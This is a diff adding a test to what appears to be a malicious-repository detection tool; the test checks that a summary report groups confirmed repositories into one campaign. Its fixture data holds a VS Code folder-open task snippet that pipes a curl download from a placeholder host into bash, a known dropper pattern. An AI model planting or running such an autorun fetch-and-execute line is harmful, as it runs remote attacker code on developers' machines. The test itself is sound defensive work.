@@ -256,6 +256,43 @@ def test_failed_post_is_counted_and_does_not_abort_run(monkeypatch, tmp_path, db
     assert "NOT REPORTED TO OSM" in md and "POST failed" in md
 
 
+def test_summary_groups_validated_repos_into_their_campaign(monkeypatch, tmp_path, db):
+    def task(host):
+        return json.dumps({"bash_findings": [{
+            "file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
+            "rule": "vscode-autorun",
+            "snippet": f"curl 'https://{host}/settings/linux?flag=606' | bash"}]})
+
+    with db.transaction() as c:
+        for name, host in (("ta3pks/social", "one.vercel.app"),
+                           ("lfirsl/morphix", "two.vercel.app"),
+                           ("older/member", "three.vercel.app")):
+            c.execute("INSERT INTO repo_findings (full_name, detection_method, status, "
+                      "raw_payload) VALUES (?, 'signature_match', 'confirmed', ?)",
+                      (name, task(host)))
+    rows = [{"full_name": n, "score": 90, "detection_method": "signature_match"}
+            for n in ("ta3pks/social", "lfirsl/morphix")]
+    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0: rows)
+    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
+    monkeypatch.setattr(auto, "_deep_validate", lambda name: (True, "AUTO", _Tier2([])))
+    monkeypatch.setattr(auto, "repo_payload_live", lambda finding: True)
+    monkeypatch.setattr(auto, "build_report", lambda row, **k: {})
+    monkeypatch.setattr(auto, "campaign_context", lambda db, row: "")
+    out = tmp_path / "summary.md"
+    auto.run(db, limit=5, dry_run=True, summary_path=out)
+    md = out.read_text(encoding="utf-8")
+
+    from git_warden.correlate import campaign_id
+    cid = campaign_id("dropper:vscode-folderopen:settings/{os}?flag=")
+    assert "### Campaign correlation" in md
+    assert (f"| `{cid}` | `vscode-folderopen:settings/{{os}}?flag=` (dropper) "
+            "| 2 | 3 | 3 | 3 | none |") in md
+    assert "Other confirmed members: `older/member`" in md
+    assert md.count(f"| Campaign | `{cid}`: one of 3 confirmed repos") == 2
+    # The campaign block comes before the per-repo sections.
+    assert md.index("### Campaign correlation") < md.index("### Validated malicious repo")
+
+
 def test_untrusted_snippet_cannot_escape_its_code_fence():
     fenced = auto._fence("a\n```\n[click](http://evil)\n````")
     assert fenced.startswith("`````text\n") and fenced.endswith("\n`````")
